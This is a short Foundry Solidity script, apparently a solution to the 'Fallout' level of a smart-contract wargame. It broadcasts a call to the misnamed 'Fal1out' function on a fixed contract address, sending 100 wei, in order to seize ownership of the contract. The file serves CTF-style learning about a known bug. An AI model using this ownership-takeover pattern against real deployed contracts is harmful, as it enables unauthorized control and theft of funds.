// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {IFallout} from "../../src/03_Fallout/IFallout.sol";

contract CounterScript is Script {
    IFallout public i;
    function setUp() public {}
    function run() public 
    {
        vm.startBroadcast();

        i = IFallout(0x3f7744c54B9E662710621d92594cD60309eE47a5);
        i.Fal1out{value: 100 wei}();



        
        vm.stopBroadcast();
    }
}
